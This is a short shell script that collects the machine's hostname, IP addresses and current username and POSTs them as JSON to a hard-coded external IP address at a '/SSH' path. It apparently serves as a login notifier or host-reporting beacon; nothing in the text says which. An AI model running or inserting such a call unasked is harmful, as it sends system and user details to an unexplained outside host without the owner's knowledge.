#!/bin/sh

servername=$(hostname)
ipaddress=$(hostname -I)
useradmin=$(whoami)

body=$(cat <<EOF
{
"user": "$useradmin",
"servername": "$servername",
"ip": "$ipaddress"
}
EOF
)


curl http://20.253.162.142/SSH \
    -v -i -L\
    -X POST \
    -H "Accept: application/json" \
    -H "Content-Type:application/json" \
    -d "$body"